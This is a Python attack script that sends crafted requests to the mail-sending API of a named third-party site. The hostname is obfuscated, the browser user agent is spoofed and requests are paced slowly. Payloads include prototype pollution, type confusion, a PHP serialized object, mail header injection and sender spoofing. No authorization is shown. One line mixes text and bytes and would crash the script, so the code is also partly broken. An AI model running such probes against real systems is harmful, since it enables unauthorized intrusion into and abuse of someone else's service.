import requests, json, time
S = requests.Session()
S.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36'})
HOST = 'www.' + 'infinitycapital' + '.bh'
B = 'https://' + HOST
RCPT = 'probe@' + 'probe.local'
log = open('tool_outputs/d12_deser.log','a')
def out(*a):
    s=' | '.join(str(x) for x in a)
    print(s, flush=True); log.write(s+'\n'); log.flush()

WAIT = 70
def send(tag, data=None, json_body=None, ctype='application/x-www-form-urlencoded', raw=None, path='/api/send'):
    time.sleep(WAIT)
    try:
        if raw is not None:
            r = S.post(B+path, data=raw, headers={'Content-Type':ctype}, timeout=30, allow_redirects=False)
        elif json_body is not None:
            r = S.post(B+path, json=json_body, timeout=30, allow_redirects=False)
        else:
            r = S.post(B+path, data=data, headers={'Content-Type':ctype}, timeout=30, allow_redirects=False)
        out(tag, r.status_code, r.headers.get('content-type',''), r.text[:500].replace('\n',' '))
        return r
    except Exception as e:
        out(tag, 'ERR', type(e).__name__, str(e)[:90])

# 0) baseline
send('A_baseline', {'to':RCPT,'subject':'s','body':'b'})
# 1) JSON content-type (earlier gave 500) - reproduce, capture stack
send('B_json_ct', json_body={"to":RCPT,"subject":"s","body":"b"})
# 2) to as ARRAY -> mass recipient (type confusion / mass assignment)
send('C_to_array', 'to[0]=%s&to[1]=second@probe.local&subject=s&body=b' % RCPT)
# 3) to as NESTED OBJECT -> validation-bypass type confusion
send('D_to_object', 'to[email]=%s&subject=s&body=b' % RCPT)
# 4) prototype pollution via query-string style keys
send('E_proto', {'to':RCPT,'subject':'s','body':'b','__proto__[admin]':'1','constructor[prototype][polluted]':'1'})
# 5) body as object (type confusion)
send('F_body_object', 'to=%s&subject=s&body[__proto__][x]=1&body[0]=y' % RCPT)
# 6) YAML / other deserializer content types
send('G_yaml', raw='to: %s\nsubject: s\nbody: b\n' % RCPT, ctype='application/x-yaml')
send('H_msgpack_like', raw='\x82\xa6to\xa7'+RCPT.encode()+b'\xa7subject\x01s\xa4body\x01b', ctype='application/octet-stream')
# 7) PHP serialized object in body
send('I_php_ser', raw='to=%s&subject=s&body=O:8:"stdClass":1:{s:4:"user";s:6:"admin";}' % RCPT)
# 8) headers as array (type confusion -> arbitrary mail headers)
send('J_headers_array', 'to=%s&subject=s&body=b&headers[0][key]=X-Evil&headers[0][value]=1' % RCPT)
# 9) from spoof after cooldown
send('K_from', {'to':RCPT,'from':'attacker@evil.invalid','subject':'s','body':'b'})
out('DONE')
